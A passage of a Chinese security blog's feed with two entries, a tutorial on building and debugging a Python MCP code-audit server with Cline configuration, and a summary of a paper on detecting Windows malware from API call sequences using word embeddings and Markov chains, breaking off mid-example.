    <link href="https://findream.github.io/2025/07/02/MCP%20Server%E5%BC%80%E5%8F%91%E5%92%8C%E8%B0%83%E8%AF%95/"/>
    <id>https://findream.github.io/2025/07/02/MCP Server开发和调试/</id>
    <published>2025-07-02T07:02:11.000Z</published>
    <updated>2025-07-02T12:45:11.487Z</updated>
    
    <content type="html"><![CDATA[<h2 id="MCP-Server-开发"><a href="#MCP-Server-开发" class="headerlink" title="MCP Server 开发"></a>MCP Server 开发</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;我们基于python,使用官方提供的MCP库开发一个代码审计的MCP Server。MCP主要可以三种类型的功能，</p><ul><li>1.Resources：客户端可以读取的类似文件的数据（例如 API 响应或文件内容）</li><li>2.Tools:可由 LLM 调用的函数</li><li>3.Prompts:预先编写的模板，帮助用户完成特定任务</li></ul><a id="more"></a><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如果需要做一个简单的代码审计的MCP Server，首先需要通过API函数去依次读取文件的内容，然后将文件的内容和文件路径传递给LLM，通过LLM研判这个文件是否存在高危漏洞。@tools只是实现相对应的逻辑，研判分析的任务交给LLM，不需要将研判的任务写入代码中。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;将所需要的库添加到代码中<br><figure class="highlight elm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> os</div><div class="line"><span class="title">from</span> fastmcp <span class="keyword">import</span> FastMCP</div><div class="line"><span class="title">from</span> typing <span class="keyword">import</span> Dict, Any</div><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> json</div><div class="line"><span class="title">mcp</span> = <span class="type">FastMCP</span>(<span class="string">"Code Audit Server"</span>)  #初始化<span class="type">MCP</span> <span class="type">Server</span>名字</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;然后添加Tools功能函数,这个函数需要使用<code>@mcp.tool()</code>进行修饰，这个函数功能是通过传入文件夹路径，读取这个文件夹下所有的文件的内容，传出一个dict，这个字典包含文件夹路径和文件内容。主要的实现功能重新封装在另外一个函数中。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">@mcp.tool()</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">audit_code</span><span class="params">(directory: str)</span> -&gt; Dict[str, Any]:</span></div><div class="line">    file_contents = read_files_from_directory(directory)</div><div class="line">    <span class="keyword">return</span> &#123;<span class="string">"directory"</span>: directory, <span class="string">"file_contents"</span>: file_contents&#125;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;接着实现文件内容的读取操作<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_files_from_directory</span><span class="params">(directory: str)</span> -&gt; Dict[str, str]:</span></div><div class="line">    file_contents = &#123;&#125;</div><div class="line">    <span class="keyword">for</span> root, _, files <span class="keyword">in</span> os.walk(directory):</div><div class="line">        <span class="keyword">for</span> file <span class="keyword">in</span> files:</div><div class="line">            file_path = os.path.join(root, file)</div><div class="line">            <span class="keyword">try</span>:</div><div class="line">                <span class="keyword">with</span> open(file_path, <span class="string">"r"</span>, encoding=<span class="string">"utf-8"</span>) <span class="keyword">as</span> f:</div><div class="line">                    content = f.read()</div><div class="line">                    file_contents[file] = content</div><div class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</div><div class="line">                print(<span class="string">f"Error reading file <span class="subst">&#123;file_path&#125;</span>: <span class="subst">&#123;e&#125;</span>"</span>)</div><div class="line">    <span class="keyword">return</span> file_contents</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;最后，初始化运行MCP Server即可。transport指定传输的方式，目前主要有两种传输方式：1）stdio传输和2）http传输<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</div><div class="line">    mcp.<span class="builtin-name">run</span>(<span class="attribute">transport</span>=<span class="string">'stdio'</span>)</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;通过<code>python server.py</code>即可运行MCP Server。<br>    <img src="http://hacky.wang/blog/20250702/CKuOya1lWxl6.png?imageslim" alt="mark"></p><h2 id="MCP-Inspector-调试使用"><a href="#MCP-Inspector-调试使用" class="headerlink" title="MCP Inspector 调试使用"></a>MCP Inspector 调试使用</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;我们可以使用<code>MCP Inspector</code>调试开发好的MCP Server。<code>MCP Inspector</code>基于Node.js开发，需提前安装Node.js,然后执行<code>npm install -g @modelcontextprotocol/inspector</code>命令安装<code>MCP Inspector</code>。如果使用全局安装，只需要运行<code>mcp-inspector</code>启动<code>MCP Inspector</code>。<br>    <img src="http://hacky.wang/blog/20250702/yaUJKBJT08Vq.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;执行完<code>mcp-inspector</code>命令之后，会生成一个<code>Session token</code>,一个带有session token的链接，以及一个不带session token的链接。这个<code>session token</code>后续链接MCP Servcer需要用上。通过浏览器打开<code>http://127.0.0.1:6274</code>。因为上文是通过python.exe运行server.py来运行MCP Server。只需要将页面左侧的Command和Arguments分别填入python和server.py的绝对地址。内嵌的环境变量就能自动识别。<br>    <img src="http://hacky.wang/blog/20250702/1jBgHhSBoGRE.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如果通过不带session token的链接访问。在连接MCP Server的时候会出现<code>Connection Error - Did you add the proxy session token in Configuration?</code>报错，只需要在“Configuration”的“Proxy Session Token”选项中填入之前出现的<code>Session token</code>值即可。</p><h2 id="cline-客户端配置"><a href="#cline-客户端配置" class="headerlink" title="cline 客户端配置"></a>cline 客户端配置</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;安装好cline插件之后，在<code>cline-mcp-settings.json</code>文件中设置相对应的配置即可。<br><figure class="highlight json"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">&#123;</div><div class="line">  <span class="attr">"mcpServers"</span>: &#123;</div><div class="line">    <span class="attr">"Code Audit Server"</span>: &#123;</div><div class="line">      <span class="attr">"autoApprove"</span>: [</div><div class="line">        <span class="string">"audit_code"</span></div><div class="line">      ],</div><div class="line">      <span class="attr">"disabled"</span>: <span class="literal">false</span>,</div><div class="line">      <span class="attr">"timeout"</span>: <span class="number">60</span>,</div><div class="line">      <span class="attr">"command"</span>: <span class="string">"python"</span>,</div><div class="line">      <span class="attr">"args"</span>: [</div><div class="line">        <span class="string">"C:\\Users\\zxcv\\Desktop\\audit_code\\server.py"</span></div><div class="line">      ],</div><div class="line">      <span class="attr">"transportType"</span>: <span class="string">"stdio"</span></div><div class="line">    &#125;,</div><div class="line">    <span class="attr">"Auto Arms Server"</span>: &#123;</div><div class="line">      <span class="attr">"autoApprove"</span>: [</div><div class="line">        <span class="string">"auto_arms"</span></div><div class="line">      ],</div><div class="line">      <span class="attr">"disabled"</span>: <span class="literal">false</span>,</div><div class="line">      <span class="attr">"timeout"</span>: <span class="number">60</span>,</div><div class="line">      <span class="attr">"command"</span>: <span class="string">"python"</span>,</div><div class="line">      <span class="attr">"args"</span>: [</div><div class="line">        <span class="string">"C:\\Users\\zxcv\\Desktop\\AutoArms\\server.py"</span></div><div class="line">      ],</div><div class="line">      <span class="attr">"transportType"</span>: <span class="string">"stdio"</span></div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>   <img src="http://hacky.wang/blog/20250702/KVlX5YuFvVcm.png?imageslim" alt="mark"></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;MCP-Server-开发&quot;&gt;&lt;a href=&quot;#MCP-Server-开发&quot; class=&quot;headerlink&quot; title=&quot;MCP Server 开发&quot;&gt;&lt;/a&gt;MCP Server 开发&lt;/h2&gt;&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;我们基于python,使用官方提供的MCP库开发一个代码审计的MCP Server。MCP主要可以三种类型的功能，&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;1.Resources：客户端可以读取的类似文件的数据（例如 API 响应或文件内容）&lt;/li&gt;
&lt;li&gt;2.Tools:可由 LLM 调用的函数&lt;/li&gt;
&lt;li&gt;3.Prompts:预先编写的模板，帮助用户完成特定任务&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="AI安全" scheme="https://findream.github.io/categories/AI%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>A-dynamic-Windows-malware-detection-and-prediction-method-based-on-contextual-understanding-of-API-call-sequence</title>
    <link href="https://findream.github.io/2025/01/25/A-dynamic-Windows-malware-detection-and-prediction-method-based-on-contextual-understanding-of-API-call-sequence/"/>
    <id>https://findream.github.io/2025/01/25/A-dynamic-Windows-malware-detection-and-prediction-method-based-on-contextual-understanding-of-API-call-sequence/</id>
    <published>2025-01-25T07:02:11.000Z</published>
    <updated>2025-03-06T04:27:19.752Z</updated>
    
    <content type="html"><![CDATA[<p>原文为：<a href="https://www.sciencedirect.com/science/article/abs/pii/S0167404820300444#:~:text=In%20this%20paper%2C%20we%20introduce%20the%20use%20of,exists%20between%20API%20functions%20in%20malware%20call%20sequences." target="_blank" rel="external">https://www.sciencedirect.com/science/article/abs/pii/S0167404820300444#:~:text=In%20this%20paper%2C%20we%20introduce%20the%20use%20of,exists%20between%20API%20functions%20in%20malware%20call%20sequences.</a></p><a id="more"></a><h1 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h1><p>&nbsp; &nbsp; &nbsp; &nbsp; 恶意软件API调用图是从 API 调用序列中派生出来的，被认为是理解恶意软件行为特征的代表性技术。然而，在实践中为每个恶意软件构建行为图是麻烦的。为了解决这个问题，我们研究了如何生成一个简单的特征行为图来描述恶意软件。<strong>在本文中，我们介绍了使用词嵌入来理解恶意软件调用序列中 API 函数之间存在的上下文关系。我们还提出了一种方法，将具有相似上下文特征的单个函数聚类到簇中。</strong>我们的实验结果证明了恶意软件和良性软件调用序列之间存在显著区别。基于这种区别，我们引入了一种基于<strong>马尔可夫链</strong>的检测和预测恶意软件的新方法。通过建模恶意软件和良性软件 API 调用序列的行为，我们生成了一个语义转移矩阵，描述了 API 函数之间的实际关系。我们的模型平均检测精度为 0.990，误报率为 0.010。我们还提出了一种预测方法，可以从初始 API 调用函数预测 API 调用序列是否具有恶意性。我们的模型预测的平均准确率为 0.997。因此，我们提出了一种方法，可以在恶意软件执行后检测到它们之前阻止恶意负载，避免修复损害。</p><h1 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h1><p>&nbsp; &nbsp; &nbsp; &nbsp; 计算机和互联网技术的快速发展也伴随着恶意软件的快速增长。病毒、特洛伊木马和蠕虫等恶意软件迅速变化，成为网络空间最严重的威胁。恶意软件在计算机系统上执行恶意活动。通常，恶意软件通过改变或破坏正常进程执行流程来控制计算机系统。新恶意软件实例的数量急剧增加。根据 AV-TEST，他们每天注册超过350,000个新的恶意软件和潜在不需要的应用程序（PUA）。大量恶意软件发出了如何有效分析和处理如此多样本的问题信号。因此，自动恶意软件检测成为处理新生成恶意软件不断增加的必要手段。许多研究人员专注于产生不同的恶意软件检测技术，以缓解恶意软件快速增长的速率。恶意软件检测方法可以分为静态和动态恶意软件检测<br>。静态恶意软件检测检查可移植可执行（PE）文件的内容，而无需实际执行恶意软件样本。在静态分析期间，分析器提取特征，包括字符串模式、操作码和字节序列。提取的特征用于决定文件是否为恶意软件<br>。然而，基于静态的恶意软件检测方法本身是不够的。静态分析方法的主要缺点是它可以被混淆技术轻易绕过<br>。此外，依赖于模式匹配的静态方法在检测已知恶意软件模式方面是有用的。然而，模式匹配方法在检测零日漏洞或多态恶意软件方面是无效的。因此，静态分析方法往往是不可靠的。为了应对基于静态的恶意软件检测的缺点，动态恶意软件检测方法分析恶意软件在执行期间的行为。动态分析注定要在实时性能中监控恶意软件。在这种情况下，恶意软件在安全的虚拟环境中执行，用于在实时执行期间监控恶意代码行为。</p><h1 id="2-相关工作"><a href="#2-相关工作" class="headerlink" title="2. 相关工作"></a>2. 相关工作</h1><h2 id="2-1-概述"><a href="#2-1-概述" class="headerlink" title="2.1 概述"></a>2.1 概述</h2><p>&nbsp; &nbsp; &nbsp; &nbsp; 许多研究用于分析恶意软件特征。恶意软件分析方法可以主要分为<strong>静态和动态分析</strong>。在静态分析中，通过分析可执行二进制文件或代码而不执行恶意软件来检查恶意软件文件。与静态分析相反，动态分析方法监控恶意软件执行过程。在执行期间收集、观察和记录恶意软件行为特征。动态分析方法通常在称为沙箱的安全虚拟环境中执行。常见的动态分析沙箱包括Cuckoo Sandbox和CWSandbox。沙箱的主要目标是在防止恶意软件攻击主机系统的同时，检查恶意软件的恶意行为。静态和动态分析方法各有优缺点。静态分析相对于动态分析的主要优势在于它没有程序执行引起的开销成本。然而，静态分析方法在支持打包和复杂混淆代码方面存在局限性。与静态分析相比，动态分析能够有效地分析打包和混淆的恶意软件。原因是恶意软件在执行时必须解包自己。因此，其原始和恶意代码将被加载到主内存中。然而，动态分析的主要缺点是时间和资源的消耗。恶意软件样本需要单独分析，这导致动态分析在商业应用中的局限性。在本文中，我们将专注于动态分析方法。<strong>具体来说，我们将专注于分析在恶意软件样本执行时生成的API调用序列。我们认为动态分析方法在恶意软件分析方面是最有效和准确的</strong>。原因是动态恶意软件分析捕获了反映真实恶意软件行为的可行特征。API调用可以通过静态和动态方法提取。在静态方法中，API从可执行文件的可移植可执行（PE）头中提取。然而，在动态方法中，API通过观察正在运行的可执行文件来收集。在我们的方法中，我们使用动态方法收集的API调用序列。</p><h2 id="2-2-Windows-API"><a href="#2-2-Windows-API" class="headerlink" title="2.2 Windows API"></a>2.2 Windows API</h2><p>&nbsp; &nbsp; &nbsp; &nbsp;在Windows操作系统中，用户应用程序不能直接访问硬件或系统资源。然而，它们可以依赖于动态链接库提供的接口。这些库，如kernel32.dll、user32.dll、gdi32.dll和advapi32.dll，提供了访问硬件和系统资源的功能。图1展示了Windows中的API调用机制。表1展示了提到的DLL文件及其描述的简要说明。图1中显示的接口称为Win32 API。假设用户程序想要读取文件，它调用Win32 API的文件读取函数。该过程最初调用“ntdll.dll”中索引的NtReadFile 函数。然后NtReadFile 函数调用内核模式中的关联服务例程，也称为 NtReadFile。因此，任何需要特定服务的程序都将调用内核模式中的本地 API。在程序监控的情况下，观察程序的主要方式是通过监控其API调用。API函数本身是标准的；没有所谓的恶意或正常函数类别。因此，恶意软件程序也使用标准API函数来执行其恶意目的。API调用机制不区分恶意和正常程序。恶意的或正常的进程都可以使用相同的API。然而，API调用序列的行为可以导致调用进程的上下文属性。换句话说，通过API调用序列可以判断是恶意的或正常的。然而，API函数的数量本身很大。因此，通过同时跟踪所有 API 来描述运行进程的行为属性变得困难。进程和操作系统之间的API函数调用序列被认为是恶意和正常进程之间的基本行为差异。大多数行为恶意软件分析的研究工作都集中在API调用上。API调用序列可以提供有意义的表达，支持和协助更好地理解恶意软件。API调用编码了关于恶意软件在运行时发生的隐式功能的足够信息。<br>    <img src="http://hacky.wang/blog/20250113/MRmuXmd3E4IB.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20250113/Kvq1sOwGDL1U.png?imageslim" alt="mark"></p><h1 id="3-提出的模型"><a href="#3-提出的模型" class="headerlink" title="3. 提出的模型"></a>3. 提出的模型</h1><h2 id="3-1-概述"><a href="#3-1-概述" class="headerlink" title="3.1 概述"></a>3.1 概述</h2><p>&nbsp; &nbsp; &nbsp; &nbsp;如相关工作所述，<strong>以往的研究主要集中在从API调用序列中提取模式，如n-gram。这些模式被用作恶意软件检测的特征。</strong>然而，没有人尝试<strong>检查整个序列中单个API调用之间可能存在的关系。</strong>受此启发，我们需要回答以下问题：</p><ul><li>1.恶意软件序列中的 API 调用之间是否存在某种相关性？</li><li>2.正常和恶意 API 调用序列之间是否存在可发现的差异？</li></ul><p>&nbsp; &nbsp; &nbsp; &nbsp;这些问题在以往的研究中没有得到解决。受此启发，我们试图通过动态分析引入恶意软件检测的新方向。</p><h2 id="3-2-挑战"><a href="#3-2-挑战" class="headerlink" title="3.2 挑战"></a>3.2 挑战</h2><p>&nbsp; &nbsp; &nbsp; &nbsp;在我们的工作中，我们需要找到正常/恶意调用序列中单个API函数之间可能存在的关系。然而，我们的方法面临的主要挑战是：</p><ul><li><ol><li>API 函数的数量相当大，这使得分析变得困难。</li></ol></li><li><ol><li>恶意软件通常试图逃避被跟踪或检测。因此，恶意软件作者通常添加大量不必要的 API 调用。主要目的是添加一些看起来正常的事件来隐藏其恶意行为，并使分析过程变得困难。</li></ol></li></ul><h2 id="3-3-系统概述"><a href="#3-3-系统概述" class="headerlink" title="3.3 系统概述"></a>3.3 系统概述</h2><p>&nbsp; &nbsp; &nbsp; &nbsp;程序的执行过程可以用几种方式描述。<strong>API调用和系统调用通常描述了程序的语义执行。</strong>通过这种方式，可以描述程序的行为。在本文中，我们从API调用级别和系统调用级别定义了执行程序的语义。我们提出的系统如图2所示，分为三个阶段，即初始化阶段、学习阶段和测试阶段。在以下小节中，我们将详细描述每个阶段。<br>    <img src="http://hacky.wang/blog/20250113/dbqJkYRUqwb0.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20250113/L0iCCJCyG0et.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20250113/nCKGoD7N2WGS.png?imageslim" alt="mark"></p><h3 id="3-3-1-初始化阶段"><a href="#3-3-1-初始化阶段" class="headerlink" title="3.3.1 初始化阶段"></a>3.3.1 初始化阶段</h3><p>&nbsp; &nbsp; &nbsp; &nbsp;初始化阶段的主要目标是将API函数分组到组或簇中。初始化阶段包含三个主要步骤，即<strong>1）词嵌入、2）计算API之间的相似性以及3）聚类相似性矩阵。</strong></p><h4 id="3-3-1-1-词嵌入"><a href="#3-3-1-1-词嵌入" class="headerlink" title="3.3.1.1 词嵌入"></a>3.3.1.1 词嵌入</h4><p>&nbsp; &nbsp; &nbsp; &nbsp;词嵌入是一种在n维空间中表示单词的形式。词嵌入的主要目标是将人类对语言的理解转移到机器上。Word2Vec 是最常用的词嵌入形式之一。Word2Vec以大量文本语料库作为输入，生成几百维的向量空间。输入语料库中的每个不同单词都被分配了一个相应的空间向量。<strong>单词向量在空间中的分布完全取决于输入语料库中的上下文相似性。如果两个单词在上下文中相似，它们将位于邻近空间中；如果两个单词在上下文中不同，它们将位于彼此远离的位置。</strong></p><p>&nbsp; &nbsp; &nbsp; &nbsp;在恶意软件分析的背景下，<strong>我们认为恶意软件序列中API函数的顺序并非随机存在。实际上，它可能编码了一些执行恶意活动的上下文模式。这些模式在不同的恶意软件序列中以某种方式相似。</strong>通过从大量恶意软件序列中提取这些模式，我们能够识别序列中API函数之间发生的上下文关系。</p><p>&nbsp; &nbsp; &nbsp; &nbsp;在我们提出的模型中，<strong>词嵌入模型的输入语料库是良性软件和恶意软件的API调用序列。</strong>在我们的实验中，我们将特征向量的维度设置为250，窗口大小为6，工作线程为6。词嵌入的输出如图2所示，是两个嵌入模型，即良性软件和恶意软件嵌入模型。每个嵌入模型包含其不同的API调用函数以及生成的嵌入模型。</p><h4 id="3-3-1-2-计算-API-之间的相似性"><a href="#3-3-1-2-计算-API-之间的相似性" class="headerlink" title="3.3.1.2 计算 API 之间的相似性"></a>3.3.1.2 计算 API 之间的相似性</h4><p>&nbsp; &nbsp; &nbsp; &nbsp;良性软件和恶意软件的嵌入模型可以用来计算它们的API函数之间的相似性。为了使用Word2Vec计算两个词之间的相似性，我们使用了model.similarity(argument_1, argument_2)方法，并将两个API函数作为参数传递。考虑以下两个API函数getfileversioninfosize和getfileversioninfo。第一个函数确定操作系统是否可以检索特定文件的版本信息，而第二个函数检索指定文件的版本信息。<strong>在调用 getfileversioninfo 之前，必须调用getfileversioninfosize。</strong>根据我们的嵌入模型，model.similarity(‘getfileversioninfosize’, ‘getfileversioninfo’) = 0.904。结果表示上述两个 API 函数之间的欧几里得相似性。从上面的例子中，我们可以得出结论，<strong>getfileversioninfosize与getfileversioninfo高度相似【注:这里的相似不仅仅体现在字符串的相似，更体现在在调用序列上下文中关联得密切性】。</strong></p><p>&nbsp; &nbsp; &nbsp; &nbsp;如图2中的初始化阶段所示，API之间的相似性计算以API函数作为输入，然后使用嵌入模型计算所有API函数之间的相似性。我们使用Word2Vec相似性方法来计算每个API函数与其他API函数之间的相似性。<strong>此步骤的输出是两个相似性矩阵，即良性软件相似性矩阵和恶意软件相似性矩阵。每个矩阵代表其类别序列中不同API函数之间的相似性。每个矩阵的维度取决于应用词嵌入于训练数据后得到的API函数数量。</strong></p><h4 id="3-3-1-3-聚类相似性矩阵"><a href="#3-3-1-3-聚类相似性矩阵" class="headerlink" title="3.3.1.3 聚类相似性矩阵"></a>3.3.1.3 聚类相似性矩阵</h4><p>&nbsp; &nbsp; &nbsp; &nbsp;<strong>聚类步骤的目标是将具有相似特征的单个API函数分组到簇中</strong>。聚类步骤的输入是一个相似性矩阵，它表示单个API函数与其他剩余函数之间的相似性关系。我们使用了k-means算法来对相似性矩阵进行聚类。</p><p>&nbsp; &nbsp; &nbsp; &nbsp;为了确定k-means算法的最佳簇数量，我们依赖于一种最常用的方法，<strong>称为肘部法则。</strong>该方法涉及多次运行 k-means 算法，范围为不断增加的k值。然后，它计算不同k值的 Within-Cluster Sum of Squared(WSS)错误，如公式 (1) 所描述。<br>    <img src="http://hacky.wang/blog/20250113/53tLGMluWBkI.png?imageslim" alt="mark"><br>其中X是属于簇Ck的观测值，​uk是分配给簇Ck的点的平均值。，最佳簇数量是k的值，在“肘部”处，失真/惯性开始线性减少。在我们的实验中，我们在所有数据集上评估了k的值范围为2到21。聚类步骤的输出以及初始化阶段的输出是有限数量的簇，分别用于良性软件和恶意软件。每个类别都有其包含相关 API 函数的簇。</p><h3 id="3-3-2-学习阶段"><a href="#3-3-2-学习阶段" class="headerlink" title="3.3.2 学习阶段"></a>3.3.2 学习阶段</h3><p>&nbsp; &nbsp; &nbsp; &nbsp;<strong>学习阶段的目标是捕捉恶意软件或良性软件序列中API调用之间存在的关系，然后为恶意软件和良性软件创建行为模型。</strong>在学习阶段，我们有两个级别的输出，即：</p><ul><li>1.良性软件/恶意软件簇转移矩阵</li><li>2.良性软件/恶意软件转移模型</li></ul><p>&nbsp; &nbsp; &nbsp; &nbsp;在学习阶段，我们有三个主要过程，即：1)在簇中找到 API 函数、2)创建序列链转移矩阵以及3)计算最大转移序列概率。</p><h4 id="3-3-2-1-在簇中找到API函数"><a href="#3-3-2-1-在簇中找到API函数" class="headerlink" title="3.3.2.1 在簇中找到API函数"></a>3.3.2.1 在簇中找到API函数</h4><p>&nbsp; &nbsp; &nbsp; &nbsp;在此步骤中，我们的目标是将原始API调用序列转换为簇序列。此步骤以API调用序列作为输入。序列中的每个API函数都被其包含的簇名称所替代。例如，以下序列是名为Worm.Win32.Zwr.c的恶意软件的API调用序列：<br><figure class="highlight scheme"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">[<span class="symbol">'GetSystemDirectoryA</span>', <span class="symbol">'IsDBCSLeadByte</span>', <span class="symbol">'LocalAlloc</span>', <span class="symbol">'CreateSemaphoreW</span>', <span class="symbol">'CreateSemaphoreA</span>', <span class="symbol">'GlobalAddAtomW</span>', <span class="symbol">'lstrcpynW</span>', <span class="symbol">'LoadLibraryExW</span>', <span class="symbol">'SearchPathW</span>', <span class="symbol">'CreateFileW</span>', <span class="symbol">'CreateFileMappingW</span>', <span class="symbol">'MapViewOfFileEx</span>', <span class="symbol">'GetSystemMetrics</span>', <span class="symbol">'RegisterClipboardFormatW</span>', <span class="symbol">'SystemParametersInfoW</span>', <span class="symbol">'GetDC</span>', <span class="symbol">'GetDeviceCaps</span>', <span class="symbol">'ReleaseDC</span>', <span class="symbol">'LocalAlloc</span>', <span class="symbol">'GetSysColor</span>', <span class="symbol">'GetSysColorBrush</span>', <span class="symbol">'GetStockObject</span>', <span class="symbol">'GetSystemMetrics</span>', <span class="symbol">'LoadCursorW</span>', <span class="symbol">'RegisterClassW</span>', <span class="symbol">'RegisterClassExW</span>', <span class="symbol">'LoadLibraryExW</span>', <span class="symbol">'LoadLibraryW</span>', <span class="symbol">'GetCommandLineA</span>', <span class="symbol">'GetStartupInfoA</span>', <span class="symbol">'LockResource</span>', <span class="symbol">'GetModuleFileNameA</span>', <span class="symbol">'IsBadWritePtr</span>', <span class="symbol">'RegisterClipboardFormatW</span>', <span class="symbol">'SystemParametersInfoW</span>', <span class="symbol">'GetSystemMetrics</span>', <span class="symbol">'LocalAlloc</span>', <span class="symbol">'GetSysColor</span>', <span class="symbol">'GetSysColorBrush</span>', <span class="symbol">'GetStockObject</span>', <span class="symbol">'LoadLibraryW</span>', <span class="symbol">'LoadLibraryExW</span>', <span class="symbol">'LoadCursorW</span>', <span class="symbol">'RegisterClassW</span>', <span class="symbol">'GetKeyboardType</span>', <span class="symbol">'GetCommandLineA</span>', <span class="symbol">'GetStartupInfoA</span>', <span class="symbol">'GetVersion</span>', <span class="symbol">'GetModuleFileNameA</span>', <span class="symbol">'lstrcpynA</span>', <span class="symbol">'GetThreadLocale</span>', <span class="symbol">'GetLocaleInfoW</span>', <span class="symbol">'GetLocaleInfoA</span>', <span class="symbol">'lstrlenA</span>', <span class="symbol">'LoadLibraryExW</span>', <span class="symbol">'SearchPathW</span>', <span class="symbol">'FindResourceExW</span>', <span class="symbol">'LoadResource</span>', <span class="symbol">'LoadStringA</span>', <span class="symbol">'LocalAlloc</span>', <span class="symbol">'VirtualAllocEx</span>', <span class="symbol">'GetThreadLocale</span>', <span class="symbol">'GetLocaleInfoA</span>', <span class="symbol">'GetLocaleInfoW</span>', <span class="symbol">'EnumCalendarInfoA</span>', <span class="symbol">'CreateEventA</span>', <span class="symbol">'LoadLibraryExW</span>', <span class="symbol">'lstrcpyA</span>', <span class="symbol">'CompareStringA</span>', <span class="symbol">'lstrcmpA</span>', <span class="symbol">'WaitForSingleObjectEx</span>', <span class="symbol">'WaitForSingleObject</span>', <span class="symbol">'GetProcessVersion</span>', <span class="symbol">'GlobalAlloc</span>', <span class="symbol">'DuplicateHandle</span>', <span class="symbol">'WSAStartup</span>', <span class="symbol">'LoadLibraryExW</span>', <span class="symbol">'CreateSemaphoreA</span>', <span class="symbol">'CreateSemaphoreW</span>', <span class="symbol">'ReleaseSemaphore</span>', <span class="symbol">'WaitForSingleObject</span>', <span class="symbol">'WaitForSingleObjectEx</span>', <span class="symbol">'GetWindowsDirectoryW</span>', <span class="symbol">'LocalAlloc</span>', <span class="symbol">'FindFirstFileExW</span>', <span class="symbol">'FindFirstFileA</span>', <span class="symbol">'GetModuleFileNameA</span>', <span class="symbol">'CreateFileW</span>', <span class="symbol">'WriteFile</span>', <span class="symbol">'CopyFileExW</span>', <span class="symbol">'CopyFileA</span>', <span class="symbol">'OpenEventW</span>', <span class="symbol">'WaitForSingleObject</span>', <span class="symbol">'WaitForSingleObjectEx</span>', <span class="symbol">'LoadLibraryW</span>', <span class="symbol">'LoadLibraryExW</span>', <span class="symbol">'DuplicateHandle</span>', <span class="symbol">'DeviceIoControl</span>', <span class="symbol">'SwitchToThread</span>', <span class="symbol">'WSACleanup</span>', <span class="symbol">'FreeLibrary</span>', <span class="symbol">'VirtualQueryEx</span>', <span class="symbol">'ResetEvent</span>', <span class="symbol">'VirtualFreeEx</span>', <span class="symbol">'UnregisterClassW</span>']</div></pre></td></tr></table></figure></p><p>&nbsp; &nbsp; &nbsp; &nbsp;在API调用序列中出现的每个API函数都将被搜索到簇中。找到后，它将被包含它的簇编号所替代。以下表示是上述原始API调用序列的簇序列：<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="number">9</span>,<span class="number">7</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">8</span>,<span class="number">8</span>,<span class="number">8</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">0</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">8</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">3</span>,<span 